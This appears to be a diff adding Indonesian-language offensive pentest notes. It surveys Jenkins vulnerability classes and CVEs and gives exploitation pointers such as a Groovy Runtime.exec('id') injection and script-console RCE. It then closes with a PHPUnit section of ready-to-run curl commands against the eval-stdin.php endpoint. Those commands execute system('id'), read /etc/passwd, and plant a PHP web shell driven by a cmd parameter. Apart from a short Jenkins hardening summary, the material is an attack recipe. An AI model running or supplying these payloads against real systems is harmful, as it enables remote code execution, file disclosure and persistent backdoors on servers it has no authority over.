+| **Remote Code Execution (RCE)**        | Melalui console script injection, pipeline script, atau deserialization tak aman. Contoh: eksploitasi Groovy sandbox bypass. |
+| **Authentication Bypass**              | Misconfigurasi atau bug plugin memungkinkan akses admin tanpa login.                                                         |
+| **Privilege Escalation**               | User dengan akses rendah naik ke admin atau root lewat eksploitasi plugin atau job script.                                   |
+| **Information Disclosure**             | Leak API tokens, credential, job logs, atau config file.                                                                     |
+| **Cross-Site Scripting (XSS)**         | Input form tanpa sanitasi, terutama di build description, console output.                                                    |
+| **Server-Side Request Forgery (SSRF)** | Jenkins dipakai untuk request internal jaringan (ex: `HttpRequest` plugin).                                                  |
+| **Deserialization Vulnerabilities**    | Exploit via serialized data di plugin/plugin pipeline Groovy.                                                                |
+
+Contoh Kerentanan Populer Jenkins
+
+| CVE / Bug            | Deskripsi                                             | Versi Rentan                |
+| -------------------- | ----------------------------------------------------- | --------------------------- |
+| **CVE-2018-1000861** | Pipeline script Groovy sandbox bypass → RCE           | Jenkins < 2.138             |
+| **CVE-2019-1003000** | Script Security Plugin bypass RCE                     | Script Security Plugin lama |
+| **CVE-2020-2100**    | Authentication bypass via XStream XML deserialization | Jenkins < 2.222             |
+| **CVE-2017-1000353** | Remote code execution via Groovy Script               | Banyak versi lama           |
+| **CVE-2016-0788**    | XSS via UI form input                                 | Versi lama                  |
+
+Cara Eksploitasi RCE di Jenkins
+Groovy script injection:
+Submit pipeline Groovy dengan kode jahat seperti Runtime.getRuntime().exec("id")
+
+Jenkins Script Console:
+Jika akses, langsung bisa RCE tanpa filter.
+
+Deserialization Exploit:
+Kirim data serialized jahat di HTTP request plugin.
+
+Jenkins Upload Shell?
+Jenkins sendiri jarang pakai upload shell karena lebih fokus ke job build pipeline, tapi:
+
+Bisa inject shell script via build script (shell step, batch step)
+
+Bisa buat job dengan payload shell command
+
+Jika ada plugin upload file tanpa filter → potensi upload shell ada
+
+CMS lain serupa Jenkins (CI/CD tools)
+
+| Tools        | Bug Umum                                |
+| ------------ | --------------------------------------- |
+| **GitLab**   | RCE via pipeline, SSRF, auth bypass     |
+| **TeamCity** | RCE via build script injection          |
+| **CircleCI** | Misconfigurasi pipeline → ekspos secret |
+| **TravisCI** | Leak environment variables              |
+
+Kesimpulan
+Jenkins rentan pada RCE via Groovy sandbox bypass dan deserialization.
+
+Fokus eksploitasi adalah pipeline/script injection bukan upload file biasa.
+
+Selalu update Jenkins & plugin, batasi akses Script Console dan API.
+
+Monitor log dan audit job pipeline.
+
+=====================================================================================================================================================================================================================================================================
+PHPUNIT 
+
+ENDPOINT : /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+CONTOH https://target.com/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+
+curl -X POST https://target.com/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php -d "<?php system('id'); ?>"
+curl -X POST https://target.com/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php -d "<?php system('cat /etc/passwd'); ?>"
+curl -X POST https://target.com/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php --data "<?php file_put_contents('shell.php','<?php system(\$_GET[\"cmd\"]); ?>'); ?>"
